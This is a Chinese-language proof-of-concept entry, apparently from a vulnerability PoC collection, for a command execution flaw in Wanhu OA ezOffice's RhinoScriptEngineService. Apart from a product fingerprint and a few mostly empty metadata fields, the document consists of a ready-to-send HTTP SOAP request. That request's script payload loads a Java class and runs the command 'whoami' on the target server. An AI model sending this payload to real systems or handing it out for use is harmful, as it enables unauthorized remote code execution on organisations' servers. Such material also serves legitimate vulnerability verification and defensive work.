﻿# 万户OA ezOffice RhinoScriptEngineService 命令执行漏洞

> 更新时间：2024-02-27

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="万户网络-ezOFFICE"

> 验证脚本：HTTP

```
POST //defaultroot/services/./././RhinoScriptEngineService HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: ""

<?xml version='1.0' encoding='UTF-8'?>
  <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
    <soapenv:Body>
      <eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
        <arg0 xmlns="">
          <![CDATA[
          try {
          load("nashorn:Moziilla_compat.js");
          } catch (e) {
          }
          importPackage(Packages.java.io);
          importPackage(Packages.java.lang);
          importPackage(Packages.java.util);
          importPackage(Packages.java.net);

          new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName("java.lang.String")]).newInstance(["whoami"]).toString()

          ]]>
        </arg0>
        <arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
        </arg1>
      </eval>
    </soapenv:Body>
  </soapenv:Envelope>
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：万户OA ezOffice RhinoScriptEngineService 命令执行漏洞.poc

